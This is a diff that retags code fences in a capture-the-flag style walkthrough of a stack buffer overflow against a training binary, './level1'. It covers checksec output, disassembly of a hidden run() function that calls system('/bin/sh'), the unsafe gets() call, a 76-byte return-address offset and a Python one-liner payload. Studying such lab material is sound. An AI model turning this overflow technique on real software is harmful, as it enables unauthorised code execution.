@@ -60,7 +60,7 @@ $ checksec --file ./level1
 
 Example output:
 
-```
+```bash
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level1
 ```
@@ -81,7 +81,7 @@ Given these results, our environment appears suitable for a classic buffer overf
 
 Using the `info functions` command in GDB, we identify the following relevant symbols:
 
-```
+```gdb
 0x08048444  run
 0x08048480  main
 ```
@@ -94,7 +94,7 @@ These are the two application-specific functions relevant to our analysis. We wi
 
 ### Function Prologue
 
-```
+```asm
 0x08048444 <+0>:     push   %ebp
 0x08048445 <+1>:     mov    %esp,%ebp
 0x08048447 <+3>:     sub    $0x18,%esp
@@ -110,7 +110,7 @@ These are the two application-specific functions relevant to our analysis. We wi
 
 ### Prepare `fwrite("Good...", 1, 19, stdout)`
 
-```
+```asm
 0x0804844a <+6>:     mov    0x80497c0,%eax
 0x0804844f <+11>:    mov    %eax,%edx
 ```
@@ -120,7 +120,7 @@ These are the two application-specific functions relevant to our analysis. We wi
 * `<+6>` Move the value at address `0x80497c0` into `eax`. This points to `stdout`.
 * `<+11>` Copy it into `edx`.
 
-```
+```asm
 0x08048451 <+13>:    mov    $0x8048570,%eax
 ```
 
@@ -128,31 +128,31 @@ These are the two application-specific functions relevant to our analysis. We wi
 
 * `0x8048570` likely points to `"Good... Wait what?\n"`
 
-```
+```asm
 0x08048456 <+18>:    mov    %edx,0xc(%esp)
 ```
 
 <+18>: Set fourth argument (FILE \*stream) for `fwrite()`.
 
-```
+```asm
 0x0804845a <+22>:    movl   $0x13,0x8(%esp)
 ```
 
 <+22>: Set third argument (size\_t count = 19).
 
-```
+```asm
 0x08048462 <+30>:    movl   $0x1,0x4(%esp)
 ```
 
 <+30>: Set second argument (size\_t size = 1).
 
-```
+```asm
 0x0804846a <+38>:    mov    %eax,(%esp)
 ```
 
 <+38>: Set first argument (const void \*ptr) = address of message string.
 
-```
+```asm
 0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
 ```
 
@@ -162,13 +162,13 @@ These are the two application-specific functions relevant to our analysis. We wi
 
 ### Execute `system("/bin/sh")`
 
-```
+```asm
 0x08048472 <+46>:    movl   $0x8048584,(%esp)
 ```
 
 <+46>: Set argument for `system()` pointer to `"/bin/sh"`.
 
-```
+```asm
 0x08048479 <+53>:    call   0x8048360 <system@plt>
 ```
 
@@ -178,7 +178,7 @@ These are the two application-specific functions relevant to our analysis. We wi
 
 ### Function Epilogue
 
-```
+```asm
 0x0804847e <+58>:    leave
 0x0804847f <+59>:    ret
 ```
@@ -191,7 +191,7 @@ These are the two application-specific functions relevant to our analysis. We wi
 
 ### Function Prologue
 
-```
+```asm
 0x08048480 <+0>:     push   %ebp
 0x08048481 <+1>:     mov    %esp,%ebp
 0x08048483 <+3>:     and    $0xfffffff0,%esp
@@ -209,19 +209,19 @@ These are the two application-specific functions relevant to our analysis. We wi
 
 ### Vulnerable `gets()` Call
 
-```
+```asm
 0x08048489 <+9>:     lea    0x10(%esp),%eax
 ```
 
 <+9>: Compute address of buffer (esp + 0x10) and store it in `eax`.
 
-```
+```asm
 0x0804848d <+13>:    mov    %eax,(%esp)
 ```
 
 <+13>: Place the buffer address as the first argument for `gets()`.
 
-```
+```asm
 0x08048490 <+16>:    call   0x8048340 <gets@plt>
 ```
 
@@ -233,7 +233,7 @@ These are the two application-specific functions relevant to our analysis. We wi
 
 ### Function Epilogue
 
-```
+```asm
 0x08048495 <+21>:    leave
 0x08048496 <+22>:    ret
 ```
@@ -262,7 +262,7 @@ We will now use GDB to confirm the following:
 
 First, we identify where user input is read. From our disassembly, we know that the program uses the unsafe `gets()` function to read input into a buffer:
 
-```bash
+```gdb
 $ gdb ./level1
 (gdb) break *0x08048490   # sets breakpoint at call to gets()
 (gdb) run
@@ -270,7 +270,7 @@ $ gdb ./level1
 
 Once the breakpoint is hit, we are paused just before user input is read:
 
-```
+```gdb
 Breakpoint 1, 0x08048490 in main ()
 ```
 
@@ -284,7 +284,7 @@ In the x86 calling convention, local buffers are typically placed at an offset r
 
 So the distance between the start of the buffer and the return address is:
 
-```bash
+```gdb
 (gdb) print ($ebp+4) - ($esp+0x10)
 $1 = 76
 ```
@@ -320,18 +320,18 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2...
 
 It crashes:
 
-```
+```bash
 Program received signal SIGSEGV, Segmentation fault.
 0x63413563 in ?? ()
 ```
 
 Launch GDB and inspect EIP:
 
-```bash
+```gdb
 (gdb) info registers eip
 ```
 
-```
+```gdb
 eip            0x63413563       0x63413563
 ```
 
@@ -348,7 +348,7 @@ This confirms what we found manually.
 
 ### 4. Find the address of the `run()` function
 
-```bash
+```gdb
 (gdb) info functions run
 0x08048444  run
 ```
@@ -370,14 +370,14 @@ $ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/payload
 
 Then run the binary through GDB:
 
-```bash
+```gdb
 $ gdb ./level1
 (gdb) run < /tmp/payload
 ```
 
 Expected output:
 
-```
+```bash
 Good... Wait what?
 Program received signal SIGSEGV, Segmentation fault.
 0x00000000 in ?? ()
